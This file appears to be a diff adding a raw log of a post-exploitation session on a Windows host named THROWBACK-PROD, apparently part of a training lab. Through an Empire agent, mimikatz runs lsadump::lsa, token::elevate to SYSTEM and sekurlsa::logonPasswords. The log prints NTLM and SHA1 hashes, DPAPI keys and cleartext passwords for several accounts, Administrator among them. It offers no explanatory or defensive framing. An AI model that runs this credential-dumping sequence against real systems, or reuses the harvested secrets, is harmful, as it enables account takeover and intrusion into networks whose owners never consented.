@@ -1,0 +1,556 @@
+(empireadmin) function DNFCK
+{
+[CmdletBinding(DefaultParameterSetName="DumpCreds")]
+Param(
+    [Parameter(Position 
+ Hostname: THROWBACK-PROD.THROWBACK.local / S-1-5-21-1142397155-17714838-1651365392
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2020 20:07:46
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(powershell) # lsadump::lsa /patch
+Domain : THROWBACK-PROD / S-1-5-21-1142397155-17714838-1651365392
+
+RID  : 000003f2 (1010)
+User : admin-petersj
+LM   : 
+NTLM : 74fb0a2ee8a066b1e372475dcbc121c5
+
+RID  : 000001f4 (500)
+User : Administrator
+LM   : 
+NTLM : a06e58d15a2585235d18598788b8147a
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+LM   : 
+NTLM : 
+
+RID  : 000001f5 (501)
+User : Guest
+LM   : 
+NTLM : 
+
+RID  : 000003f1 (1009)
+User : sshd
+LM   : 
+NTLM : fe2acb5ea93988befc849a6981e0526a
+
+RID  : 000001f8 (504)
+User : WDAGUtilityAccount
+LM   : 
+NTLM : 58f8e0214224aebc2c5f82fb7cb47ca1
+
+(empireadmin) function DNFCK
+{
+[CmdletBinding(DefaultParameterSetName="DumpCreds")]
+Param(
+    [Parameter(Position 
+ Hostname: THROWBACK-PROD.THROWBACK.local / S-1-5-21-1142397155-17714838-1651365392
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2020 20:07:46
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(powershell) # privilege::debug
+Privilege '20' OK
+
+(empireadmin) whoami 
+ THROWBACK-PROD\admin-petersj
+(empireadmin) function DNFCK
+{
+[CmdletBinding(DefaultParameterSetName="DumpCreds")]
+Param(
+    [Parameter(Position 
+ Hostname: THROWBACK-PROD.THROWBACK.local / S-1-5-21-1142397155-17714838-1651365392
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2020 20:07:46
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(powershell) # token::elevate
+Token Id  : 0
+User name : 
+SID name  : NT AUTHORITY\SYSTEM
+
+704	{0;000003e7} 1 D 19629     	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Primary
+ -> Impersonated !
+ * Process Token : {0;00135950} 2 D 1466805   	THROWBACK-PROD\admin-petersj	S-1-5-21-1142397155-17714838-1651365392-1010	(13g,24p)	Primary
+ * Thread Token  : {0;000003e7} 1 D 1717984   	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Impersonation (Delegation)
+
+(empireadmin) whoami 
+ THROWBACK-PROD\admin-petersj
+(empireadmin) function DNFCK
+{
+[CmdletBinding(DefaultParameterSetName="DumpCreds")]
+Param(
+    [Parameter(Position 
+ Hostname: THROWBACK-PROD.THROWBACK.local / S-1-5-21-1142397155-17714838-1651365392
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2020 20:07:46
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(powershell) # sekurlsa::logonPasswords
+
+Authentication Id : 0 ; 922926 (00000000:000e152e)
+Session           : Service from 0
+User Name         : DefaultAppPool
+Domain            : IIS APPPOOL
+Logon Server      : (null)
+Logon Time        : 9/6/2020 4:10:04 AM
+SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
+	msv :	
+	 [00000003] Primary
+	 * Username : THROWBACK-PROD$
+	 * Domain   : THROWBACK
+	 * NTLM     : dad1f9ec117ec681c6fa1d53e6b1beed
+	 * SHA1     : 9958f9e24bf5dba15744caafd86cb671b84a0b68
+	tspkg :	
+	wdigest :	
+	 * Username : THROWBACK-PROD$
+	 * Domain   : THROWBACK
+	 * Password : (null)
+	kerberos :	
+	 * Username : THROWBACK-PROD$
+	 * Domain   : THROWBACK.local
+	 * Password : 0c ff cd d2 06 73 40 6e b1 c8 ba df 56 99 1e 90 9e d4 0c 17 d0 db eb 00 81 60 68 22 f7 e0 2d 0a ed 8e 4f af b7 44 13 6d 3d 3e 41 a1 f6 c9 79 cc a9 cf 31 95 52 19 43 51 50 35 da 54 9f ce 96 00 df e9 d9 02 d1 c1 36 35 58 11 49 1a a2 27 8d 98 35 78 80 80 56 21 1a fb 90 df 37 33 5d 31 25 42 c1 17 85 16 f2 3b 2c a9 00 1c ac 5f 44 52 09 69 fe 4a 35 6a ed c6 0d 98 f4 e5 74 20 f8 c4 e9 13 2f ad 5f 44 46 1c cc f2 f2 3c c0 aa a4 a2 11 ae 6f d3 f8 43 38 05 a3 e4 e9 40 f2 54 84 c8 c5 03 64 aa f7 6a ab b0 13 24 93 c2 48 37 18 75 b0 91 46 f9 6b cf ee 41 b3 1c 2b 98 bb c4 31 d8 2f f4 7a 59 57 a1 48 34 ac 57 34 9a d1 c2 fa 4f 22 e2 42 80 de fa 3d 33 6c 99 64 41 56 4a 35 91 03 47 97 92 33 27 37 9b 62 15 c2 32 50 2b ff db 9f a7 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 681352 (00000000:000a6588)
+Session           : RemoteInteractive from 2
+User Name         : PetersJ
+Domain            : THROWBACK
+Logon Server      : THROWBACK-DC01
+Logon Time        : 9/6/2020 4:06:45 AM
+SID               : S-1-5-21-3906589501-690843102-3982269896-1202
+	msv :	
+	 [00000003] Primary
+	 * Username : PetersJ
+	 * Domain   : THROWBACK
+	 * NTLM     : b81e7daf21f66ff3b8f7c59f3b88f9b6
+	 * SHA1     : c0c2f57355e44b7fadbfe9921537d452133997f4
+	 * DPAPI    : 3bf226ffb12ebe58a21b1a5758072047
+	tspkg :	
+	wdigest :	
+	 * Username : PetersJ
+	 * Domain   : THROWBACK
+	 * Password : (null)
+	kerberos :	
+	 * Username : PetersJ
+	 * Domain   : THROWBACK.LOCAL
+	 * Password : (null)
+	ssp :	
+	credman :	
+	 [00000000]
+	 * Username : admin-petersj
+	 * Domain   : localadmin.pass
+	 * Password : SinonFTW123!
+	 [00000001]
+	 * Username : THROWBACK-PROD\admin-petersj
+	 * Domain   : THROWBACK-PROD\admin-petersj
+	 * Password : SinonFTW123!
+
+Authentication Id : 0 ; 649095 (00000000:0009e787)
+Session           : Interactive from 2
+User Name         : UMFD-2
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 9/6/2020 4:06:44 AM
+SID               : S-1-5-96-0-2
+	msv :	
+	 [00000003] Primary
+	 * Username : THROWBACK-PROD$
+	 * Domain   : THROWBACK
+	 * NTLM     : dad1f9ec117ec681c6fa1d53e6b1beed
+	 * SHA1     : 9958f9e24bf5dba15744caafd86cb671b84a0b68
+	tspkg :	
+	wdigest :	
+	 * Username : THROWBACK-PROD$
+	 * Domain   : THROWBACK
+	 * Password : (null)
+	kerberos :	
+	 * Username : THROWBACK-PROD$
+	 * Domain   : THROWBACK.local
+	 * Password : 0c ff cd d2 06 73 40 6e b1 c8 ba df 56 99 1e 90 9e d4 0c 17 d0 db eb 00 81 60 68 22 f7 e0 2d 0a ed 8e 4f af b7 44 13 6d 3d 3e 41 a1 f6 c9 79 cc a9 cf 31 95 52 19 43 51 50 35 da 54 9f ce 96 00 df e9 d9 02 d1 c1 36 35 58 11 49 1a a2 27 8d 98 35 78 80 80 56 21 1a fb 90 df 37 33 5d 31 25 42 c1 17 85 16 f2 3b 2c a9 00 1c ac 5f 44 52 09 69 fe 4a 35 6a ed c6 0d 98 f4 e5 74 20 f8 c4 e9 13 2f ad 5f 44 46 1c cc f2 f2 3c c0 aa a4 a2 11 ae 6f d3 f8 43 38 05 a3 e4 e9 40 f2 54 84 c8 c5 03 64 aa f7 6a ab b0 13 24 93 c2 48 37 18 75 b0 91 46 f9 6b cf ee 41 b3 1c 2b 98 bb c4 31 d8 2f f4 7a 59 57 a1 48 34 ac 57 34 9a d1 c2 fa 4f 22 e2 42 80 de fa 3d 33 6c 99 64 41 56 4a 35 91 03 47 97 92 33 27 37 9b 62 15 c2 32 50 2b ff db 9f a7 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 294290 (00000000:00047d92)
+Session           : Service from 0
+User Name         : sshd_1748
+Domain            : VIRTUAL USERS
+Logon Server      : (null)
+Logon Time        : 9/6/2020 3:47:54 AM
+SID               : S-1-5-111-3847866527-469524349-687026318-516638107-1125189541-1748
+	msv :	
+	 [00000003] Primary
+	 * Username : THROWBACK-PROD$
+	 * Domain   : THROWBACK
+	 * NTLM     : dad1f9ec117ec681c6fa1d53e6b1beed
+	 * SHA1     : 9958f9e24bf5dba15744caafd86cb671b84a0b68
+	tspkg :	
+	wdigest :	
+	 * Username : THROWBACK-PROD$
+	 * Domain   : THROWBACK
+	 * Password : (null)
+	kerberos :	
+	 * Username : THROWBACK-PROD$
+	 * Domain   : THROWBACK.local
+	 * Password : 0c ff cd d2 06 73 40 6e b1 c8 ba df 56 99 1e 90 9e d4 0c 17 d0 db eb 00 81 60 68 22 f7 e0 2d 0a ed 8e 4f af b7 44 13 6d 3d 3e 41 a1 f6 c9 79 cc a9 cf 31 95 52 19 43 51 50 35 da 54 9f ce 96 00 df e9 d9 02 d1 c1 36 35 58 11 49 1a a2 27 8d 98 35 78 80 80 56 21 1a fb 90 df 37 33 5d 31 25 42 c1 17 85 16 f2 3b 2c a9 00 1c ac 5f 44 52 09 69 fe 4a 35 6a ed c6 0d 98 f4 e5 74 20 f8 c4 e9 13 2f ad 5f 44 46 1c cc f2 f2 3c c0 aa a4 a2 11 ae 6f d3 f8 43 38 05 a3 e4 e9 40 f2 54 84 c8 c5 03 64 aa f7 6a ab b0 13 24 93 c2 48 37 18 75 b0 91 46 f9 6b cf ee 41 b3 1c 2b 98 bb c4 31 d8 2f f4 7a 59 57 a1 48 34 ac 57 34 9a d1 c2 fa 4f 22 e2 42 80 de fa 3d 33 6c 99 64 41 56 4a 35 91 03 47 97 92 33 27 37 9b 62 15 c2 32 50 2b ff db 9f a7 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 44151 (00000000:0000ac77)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 9/6/2020 3:45:18 AM
+SID               : S-1-5-90-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : THROWBACK-PROD$
+	 * Domain   : THROWBACK
+	 * NTLM     : dad1f9ec117ec681c6fa1d53e6b1beed
+	 * SHA1     : 9958f9e24bf5dba15744caafd86cb671b84a0b68
+	tspkg :	
+	wdigest :	
+	 * Username : THROWBACK-PROD$
+	 * Domain   : THROWBACK
+	 * Password : (null)
+	kerberos :	
+	 * Username : THROWBACK-PROD$
+	 * Domain   : THROWBACK.local
+	 * Password : 0c ff cd d2 06 73 40 6e b1 c8 ba df 56 99 1e 90 9e d4 0c 17 d0 db eb 00 81 60 68 22 f7 e0 2d 0a ed 8e 4f af b7 44 13 6d 3d 3e 41 a1 f6 c9 79 cc a9 cf 31 95 52 19 43 51 50 35 da 54 9f ce 96 00 df e9 d9 02 d1 c1 36 35 58 11 49 1a a2 27 8d 98 35 78 80 80 56 21 1a fb 90 df 37 33 5d 31 25 42 c1 17 85 16 f2 3b 2c a9 00 1c ac 5f 44 52 09 69 fe 4a 35 6a ed c6 0d 98 f4 e5 74 20 f8 c4 e9 13 2f ad 5f 44 46 1c cc f2 f2 3c c0 aa a4 a2 11 ae 6f d3 f8 43 38 05 a3 e4 e9 40 f2 54 84 c8 c5 03 64 aa f7 6a ab b0 13 24 93 c2 48 37 18 75 b0 91 46 f9 6b cf ee 41 b3 1c 2b 98 bb c4 31 d8 2f f4 7a 59 57 a1 48 34 ac 57 34 9a d1 c2 fa 4f 22 e2 42 80 de fa 3d 33 6c 99 64 41 56 4a 35 91 03 47 97 92 33 27 37 9b 62 15 c2 32 50 2b ff db 9f a7 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : THROWBACK-PROD$
+Domain            : THROWBACK
+Logon Server      : (null)
+Logon Time        : 9/6/2020 3:45:18 AM
+SID               : S-1-5-20
+	msv :	
+	 [00000003] Primary
+	 * Username : THROWBACK-PROD$
+	 * Domain   : THROWBACK
+	 * NTLM     : dad1f9ec117ec681c6fa1d53e6b1beed
+	 * SHA1     : 9958f9e24bf5dba15744caafd86cb671b84a0b68
+	tspkg :	
+	wdigest :	
+	 * Username : THROWBACK-PROD$
+	 * Domain   : THROWBACK
+	 * Password : (null)
+	kerberos :	
+	 * Username : throwback-prod$
+	 * Domain   : THROWBACK.LOCAL
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 25552 (00000000:000063d0)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 9/6/2020 3:45:18 AM
+SID               : S-1-5-96-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : THROWBACK-PROD$
+	 * Domain   : THROWBACK
+	 * NTLM     : dad1f9ec117ec681c6fa1d53e6b1beed
+	 * SHA1     : 9958f9e24bf5dba15744caafd86cb671b84a0b68
+	tspkg :	
+	wdigest :	
+	 * Username : THROWBACK-PROD$
+	 * Domain   : THROWBACK
+	 * Password : (null)
+	kerberos :	
+	 * Username : THROWBACK-PROD$
+	 * Domain   : THROWBACK.local
+	 * Password : 0c ff cd d2 06 73 40 6e b1 c8 ba df 56 99 1e 90 9e d4 0c 17 d0 db eb 00 81 60 68 22 f7 e0 2d 0a ed 8e 4f af b7 44 13 6d 3d 3e 41 a1 f6 c9 79 cc a9 cf 31 95 52 19 43 51 50 35 da 54 9f ce 96 00 df e9 d9 02 d1 c1 36 35 58 11 49 1a a2 27 8d 98 35 78 80 80 56 21 1a fb 90 df 37 33 5d 31 25 42 c1 17 85 16 f2 3b 2c a9 00 1c ac 5f 44 52 09 69 fe 4a 35 6a ed c6 0d 98 f4 e5 74 20 f8 c4 e9 13 2f ad 5f 44 46 1c cc f2 f2 3c c0 aa a4 a2 11 ae 6f d3 f8 43 38 05 a3 e4 e9 40 f2 54 84 c8 c5 03 64 aa f7 6a ab b0 13 24 93 c2 48 37 18 75 b0 91 46 f9 6b cf ee 41 b3 1c 2b 98 bb c4 31 d8 2f f4 7a 59 57 a1 48 34 ac 57 34 9a d1 c2 fa 4f 22 e2 42 80 de fa 3d 33 6c 99 64 41 56 4a 35 91 03 47 97 92 33 27 37 9b 62 15 c2 32 50 2b ff db 9f a7 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 25458 (00000000:00006372)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 9/6/2020 3:45:18 AM
+SID               : S-1-5-96-0-0
+	msv :	
+	 [00000003] Primary
+	 * Username : THROWBACK-PROD$
+	 * Domain   : THROWBACK
+	 * NTLM     : dad1f9ec117ec681c6fa1d53e6b1beed
+	 * SHA1     : 9958f9e24bf5dba15744caafd86cb671b84a0b68
+	tspkg :	
+	wdigest :	
+	 * Username : THROWBACK-PROD$
+	 * Domain   : THROWBACK
+	 * Password : (null)
+	kerberos :	
+	 * Username : THROWBACK-PROD$
+	 * Domain   : THROWBACK.local
+	 * Password : 0c ff cd d2 06 73 40 6e b1 c8 ba df 56 99 1e 90 9e d4 0c 17 d0 db eb 00 81 60 68 22 f7 e0 2d 0a ed 8e 4f af b7 44 13 6d 3d 3e 41 a1 f6 c9 79 cc a9 cf 31 95 52 19 43 51 50 35 da 54 9f ce 96 00 df e9 d9 02 d1 c1 36 35 58 11 49 1a a2 27 8d 98 35 78 80 80 56 21 1a fb 90 df 37 33 5d 31 25 42 c1 17 85 16 f2 3b 2c a9 00 1c ac 5f 44 52 09 69 fe 4a 35 6a ed c6 0d 98 f4 e5 74 20 f8 c4 e9 13 2f ad 5f 44 46 1c cc f2 f2 3c c0 aa a4 a2 11 ae 6f d3 f8 43 38 05 a3 e4 e9 40 f2 54 84 c8 c5 03 64 aa f7 6a ab b0 13 24 93 c2 48 37 18 75 b0 91 46 f9 6b cf ee 41 b3 1c 2b 98 bb c4 31 d8 2f f4 7a 59 57 a1 48 34 ac 57 34 9a d1 c2 fa 4f 22 e2 42 80 de fa 3d 33 6c 99 64 41 56 4a 35 91 03 47 97 92 33 27 37 9b 62 15 c2 32 50 2b ff db 9f a7 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 1509262 (00000000:0017078e)
+Session           : Interactive from 0
+User Name         : admin-petersj
+Domain            : THROWBACK-PROD
+Logon Server      : THROWBACK-PROD
+Logon Time        : 9/6/2020 4:27:20 AM
+SID               : S-1-5-21-1142397155-17714838-1651365392-1010
+	msv :	
+	 [00000003] Primary
+	 * Username : admin-petersj
+	 * Domain   : THROWBACK-PROD
+	 * NTLM     : 74fb0a2ee8a066b1e372475dcbc121c5
+	 * SHA1     : ae40d7644fc099822b85ce01185468a35b5a16b1
+	tspkg :	
+	wdigest :	
+	 * Username : admin-petersj
+	 * Domain   : THROWBACK-PROD
+	 * Password : (null)
+	kerberos :	
+	 * Username : admin-petersj
+	 * Domain   : THROWBACK-PROD
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 1268048 (00000000:00135950)
+Session           : Interactive from 0
+User Name         : admin-petersj
+Domain            : THROWBACK-PROD
+Logon Server      : THROWBACK-PROD
+Logon Time        : 9/6/2020 4:16:29 AM
+SID               : S-1-5-21-1142397155-17714838-1651365392-1010
+	msv :	
+	 [00000003] Primary
+	 * Username : admin-petersj
+	 * Domain   : THROWBACK-PROD
+	 * NTLM     : 74fb0a2ee8a066b1e372475dcbc121c5
+	 * SHA1     : ae40d7644fc099822b85ce01185468a35b5a16b1
+	tspkg :	
+	wdigest :	
+	 * Username : admin-petersj
+	 * Domain   : THROWBACK-PROD
+	 * Password : (null)
+	kerberos :	
+	 * Username : admin-petersj
+	 * Domain   : THROWBACK-PROD
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 650064 (00000000:0009eb50)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 9/6/2020 4:06:44 AM
+SID               : S-1-5-90-0-2
+	msv :	
+	 [00000003] Primary
+	 * Username : THROWBACK-PROD$
+	 * Domain   : THROWBACK
+	 * NTLM     : dad1f9ec117ec681c6fa1d53e6b1beed
+	 * SHA1     : 9958f9e24bf5dba15744caafd86cb671b84a0b68
+	tspkg :	
+	wdigest :	
+	 * Username : THROWBACK-PROD$
+	 * Domain   : THROWBACK
+	 * Password : (null)
+	kerberos :	
+	 * Username : THROWBACK-PROD$
+	 * Domain   : THROWBACK.local
+	 * Password : 0c ff cd d2 06 73 40 6e b1 c8 ba df 56 99 1e 90 9e d4 0c 17 d0 db eb 00 81 60 68 22 f7 e0 2d 0a ed 8e 4f af b7 44 13 6d 3d 3e 41 a1 f6 c9 79 cc a9 cf 31 95 52 19 43 51 50 35 da 54 9f ce 96 00 df e9 d9 02 d1 c1 36 35 58 11 49 1a a2 27 8d 98 35 78 80 80 56 21 1a fb 90 df 37 33 5d 31 25 42 c1 17 85 16 f2 3b 2c a9 00 1c ac 5f 44 52 09 69 fe 4a 35 6a ed c6 0d 98 f4 e5 74 20 f8 c4 e9 13 2f ad 5f 44 46 1c cc f2 f2 3c c0 aa a4 a2 11 ae 6f d3 f8 43 38 05 a3 e4 e9 40 f2 54 84 c8 c5 03 64 aa f7 6a ab b0 13 24 93 c2 48 37 18 75 b0 91 46 f9 6b cf ee 41 b3 1c 2b 98 bb c4 31 d8 2f f4 7a 59 57 a1 48 34 ac 57 34 9a d1 c2 fa 4f 22 e2 42 80 de fa 3d 33 6c 99 64 41 56 4a 35 91 03 47 97 92 33 27 37 9b 62 15 c2 32 50 2b ff db 9f a7 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 295193 (00000000:00048119)
+Session           : NetworkCleartext from 0
+User Name         : PetersJ
+Domain            : THROWBACK
+Logon Server      : THROWBACK-DC01
+Logon Time        : 9/6/2020 3:47:56 AM
+SID               : S-1-5-21-3906589501-690843102-3982269896-1202
+	msv :	
+	 [00000003] Primary
+	 * Username : PetersJ
+	 * Domain   : THROWBACK
+	 * NTLM     : b81e7daf21f66ff3b8f7c59f3b88f9b6
+	 * SHA1     : c0c2f57355e44b7fadbfe9921537d452133997f4
+	 * DPAPI    : 3bf226ffb12ebe58a21b1a5758072047
+	tspkg :	
+	wdigest :	
+	 * Username : PetersJ
+	 * Domain   : THROWBACK
+	 * Password : (null)
+	kerberos :	
+	 * Username : PetersJ
+	 * Domain   : THROWBACK.LOCAL
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 160247 (00000000:000271f7)
+Session           : Batch from 0
+User Name         : BlaireJ
+Domain            : THROWBACK
+Logon Server      : THROWBACK-DC01
+Logon Time        : 9/6/2020 3:45:32 AM
+SID               : S-1-5-21-3906589501-690843102-3982269896-1116
+	msv :	
+	 [00000003] Primary
+	 * Username : BlaireJ
+	 * Domain   : THROWBACK
+	 * NTLM     : c374ecb7c2ccac1df3a82bce4f80bb5b
+	 * SHA1     : 6522277853426f24275c4c0b0381458ef452e640
+	 * DPAPI    : db241bce607cacb4b04d032e25071f0f
+	tspkg :	
+	wdigest :	
+	 * Username : BlaireJ
+	 * Domain   : THROWBACK
+	 * Password : (null)
+	kerberos :	
+	 * Username : BlaireJ
+	 * Domain   : THROWBACK.LOCAL
+	 * Password : 7eQgx6YzxgG3vC45t5k9
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 995 (00000000:000003e3)
+Session           : Service from 0
+User Name         : IUSR
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 9/6/2020 3:45:22 AM
+SID               : S-1-5-17
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 85057 (00000000:00014c41)
+Session           : Batch from 0
+User Name         : Administrator
+Domain            : THROWBACK-PROD
+Logon Server      : THROWBACK-PROD
+Logon Time        : 9/6/2020 3:45:19 AM
+SID               : S-1-5-21-1142397155-17714838-1651365392-500
+	msv :	
+	 [00000003] Primary
+	 * Username : Administrator
+	 * Domain   : THROWBACK-PROD
+	 * NTLM     : a06e58d15a2585235d18598788b8147a
+	 * SHA1     : 4e40938facb10fb6aa244240301b791a0454f328
+	tspkg :	
+	wdigest :	
+	 * Username : Administrator
+	 * Domain   : THROWBACK-PROD
+	 * Password : (null)
+	kerberos :	
+	 * Username : Administrator
+	 * Domain   : THROWBACK-PROD
+	 * Password : (null)
+	ssp :	
+	credman :	
+	 [00000000]
+	 * Username : admin-petersj
+	 * Domain   : THROWBACK-PROD
+	 * Password : SinonFTW123!
+	 [00000001]
+	 * Username : admin-petersj
+	 * Domain   : Login
+	 * Password : SinonFTW123!
+	 [00000002]
+	 * Username : THROWBACK-PROD\admin-petersj
+	 * Domain   : THROWBACK-PROD\admin-petersj
+	 * Password : SinonFTW123!
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 9/6/2020 3:45:19 AM
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 24198 (00000000:00005e86)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 9/6/2020 3:45:18 AM
+SID               : 
+	msv :	
+	 [00000003] Primary
+	 * Username : THROWBACK-PROD$
+	 * Domain   : THROWBACK
+	 * NTLM     : dad1f9ec117ec681c6fa1d53e6b1beed
+	 * SHA1     : 9958f9e24bf5dba15744caafd86cb671b84a0b68
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : THROWBACK-PROD$
+Domain            : THROWBACK
+Logon Server      : (null)
+Logon Time        : 9/6/2020 3:45:18 AM
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : THROWBACK-PROD$
+	 * Domain   : THROWBACK
+	 * Password : (null)
+	kerberos :	
+	 * Username : throwback-prod$
+	 * Domain   : THROWBACK.LOCAL
+	 * Password : (null)
+	ssp :	
+	credman :	
